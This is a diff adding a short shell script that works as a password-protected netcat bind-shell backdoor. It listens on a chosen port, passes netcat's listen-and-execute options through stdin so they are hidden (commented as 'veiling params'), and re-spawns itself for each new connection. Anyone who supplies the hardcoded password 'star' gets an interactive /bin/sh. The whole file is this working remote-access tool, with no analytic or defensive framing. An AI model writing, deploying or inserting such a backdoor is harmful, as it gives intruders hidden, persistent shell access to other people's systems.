@@ -1,0 +1,33 @@
+#!/bin/sh
+
+NC=./nc
+SHELL="/bin/sh"
+PW="star"
+
+# on first invocation, export $PW and $port to subshells
+export PW port
+if [ $1 ] ; then
+        port=$1
+        #echo -n pass:
+        #read PW
+fi
+
+# do we know the port to listen on?
+if [ ! $port ]; then
+        echo USAGE: $0 port ;
+        exit;
+fi
+
+# wait for further connections (veiling params)
+echo "-l -p $port -e $0" | $NC 2>/dev/null &
+[ $1 ] && exit; # first invocation exit here
+
+# ask for password
+unset p
+until [ "$p" = "$PW" ]; do
+        echo -n "pass:"
+        read p
+done
+
+# received good password. present a shell
+$SHELL --noediting -i
